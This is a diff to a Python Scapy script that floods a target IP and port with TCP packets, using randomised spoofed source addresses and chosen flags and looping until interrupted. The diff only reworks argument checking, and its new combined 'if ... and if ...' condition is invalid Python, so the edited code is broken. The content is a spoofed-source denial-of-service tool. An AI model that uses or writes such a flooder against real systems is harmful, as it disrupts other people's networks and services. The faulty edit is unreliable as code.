@@ -18,52 +18,35 @@ def main():
         socket.inet_aton(args.target_ip) # Checks if it's a legal IP.
         
     except:    
-        print('[-]Please, use --target-ip or -t to set a Target IP Address!')
-        print('[!]Example: -t 10.20.30.40')
-        print('[?] -h for help')
+        parser.print_help()
         sys.exit(1)
     
-    
-    if args.target_ip is not None: # Checks if argument is not empty
-        if args.target_port is not None:
-            if args.tcp_flag is not None:
-                target_ip = args.target_ip # target IP address (should be a testing router/firewall)
+    # Checks if argument is not empty
+    if args.target_ip is not None and if args.target_port is not None and if args.tcp_flag is not None:
+        target_ip = args.target_ip # target IP address (should be a testing router/firewall)
 
-                target_port = int(args.target_port) # the target port u want to flood
+        target_port = int(args.target_port) # the target port u want to flood
 
-                tcp_flag = args.tcp_flag # TCP Flag to flood
+        tcp_flag = args.tcp_flag # TCP Flag to flood
 
-                ip = IP(src=RandIP(), dst=target_ip) # forge IP packet with source IP Spoofing and target ip as the destination IP address
+        ip = IP(src=RandIP(), dst=target_ip) # forge IP packet with source IP Spoofing and target ip as the destination IP address
 
-                tcp = TCP(sport=RandShort(), dport=target_port, flags=tcp_flag) # random source port, use TCP SYN packet.
+        tcp = TCP(sport=RandShort(), dport=target_port, flags=tcp_flag) # random source port, use TCP SYN packet.
 
-                raw = Raw(b"X"*1024) # add some flooding data (1KB in this case, don't increase it too much, # otherwise, it won't work.)
+        raw = Raw(b"X"*1024) # add some flooding data (1KB in this case, don't increase it too much, # otherwise, it won't work.)
 
-                p = ip / tcp / raw # stack up the layers
+        p = ip / tcp / raw # stack up the layers
 
-                send(p, count=1, verbose=0) # send 1 packet to test if target ip is valid
+        send(p, count=1, verbose=0) # send 1 packet to test if target ip is valid
 
-                print("The Flood has commence, do CTRL+C to cancel / exit")
+        print("The Flood has commence, do CTRL+C to cancel / exit")
 
-                send(p, loop=1, verbose=0) # send the constructed packet in a loop until CTRL+C is detected
+        send(p, loop=1, verbose=0) # send the constructed packet in a loop until CTRL+C is detected
 
-            else:
-                print('[-]Please, use --tcp-flag or -f to set a TCP Flag to flood!')
-                print('[!]Example: -f S')
-                print('[!]Flags: S, R, A')
-                print('[?] -h for help')
-                sys.exit(1)
-        else:
-            print('[-]Please, use --target-port or -p to set a Target Port!')
-            print('[!]Example: -p 80')
-            print('[?] -h for help')
-            sys.exit(1)
     else:
-        print('[-]Please, use --target-ip or -t to set a Target IP Address!')
-        print('[!]Example: -t 10.20.30.40')
-        print('[?] -h for help')
+        parser.print_help()
         sys.exit(1)
-            
+        
 
 main()
 sys.exit(0)
